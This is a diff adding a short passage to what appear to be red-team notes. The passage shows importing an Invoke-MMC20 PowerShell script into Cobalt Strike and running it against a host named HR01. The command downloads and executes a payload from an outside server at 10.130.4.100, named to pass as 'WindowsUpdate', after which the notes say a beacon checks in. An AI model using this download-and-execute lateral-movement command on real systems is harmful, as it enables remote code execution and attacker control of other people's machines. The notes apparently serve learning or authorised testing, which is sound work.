@@ -35,6 +35,14 @@ function Invoke-MMC20
 
 }
 ```
+We can import this script into Cobalt Strike and then execute it. 
+```powershell
+powershell-import C:\Tools\Invoke-MMC20.ps1
+powershell Invoke-MMC20 -Target HR01 -Command "IEX ((new-object net.webclient).downloadstring('http://10.130.4.100:8888/WindowsUpdate'))"
+```
+After a few seconds, a new beacon will check in on HR01
+
+![[Pasted image 20240412013506.png]]
 
 ---
 # Windows
